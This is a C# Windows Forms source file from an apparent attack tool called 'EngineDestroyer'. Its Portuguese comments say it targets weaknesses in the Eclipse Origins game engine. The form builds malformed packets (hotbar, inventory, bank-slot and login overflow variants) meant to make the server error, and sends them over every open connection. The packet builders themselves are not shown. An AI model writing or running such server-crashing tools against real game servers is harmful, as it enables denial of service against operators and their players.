using System;
using System.Windows.Forms;

namespace EngineDestroyer {
    /// <summary>
    /// Este são as principais fraquezas no eclipse origins.
    /// </summary>
    public partial class FrmOverflow : Form {
        public FrmOverflow() {
            InitializeComponent();

        }

        /// <summary>
        /// Envia um pacote para o servidor com o intuito de gerar um erro.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btn_send_Click(object sender, EventArgs e) {
            byte[] buffer = new byte[256];

            if (r_hotbarchange.Checked) {
                buffer = Packet.HotbarChange();
            }

            if (r_hotbaruse.Checked) {
                buffer = Packet.HotbarUse();
            }

            if (r_swapinv.Checked) {
                buffer = Packet.SwapInvSlots();
            }

            if (r_changebankslot.Checked) {
                buffer =  Packet.ChangeBankSlots();
            }

            if (r_login.Checked) {
                buffer = Packet.LoginOverflow(AccountManager.GenerateAccount());
            }

            lbl_size.Text = "Packet Size: " + buffer.Length + " bytes";

            if (Program.Connections == null) {
                MessageBox.Show("Connect to server before send some packet.", "Message");
                return;
            }

            for (var n = 0; n < Program.Connections.MaxConnection; n++) {
                if (Program.Connections[n].Connected) {
                    Program.Connections[n].Send(buffer);
                }
            }
        }

        private void FrmOverflow_Load(object sender, EventArgs e) {
            lbl_size.Text = "Packet Size: " + Packet.HotbarChange().Length + " bytes";
        }
    }
}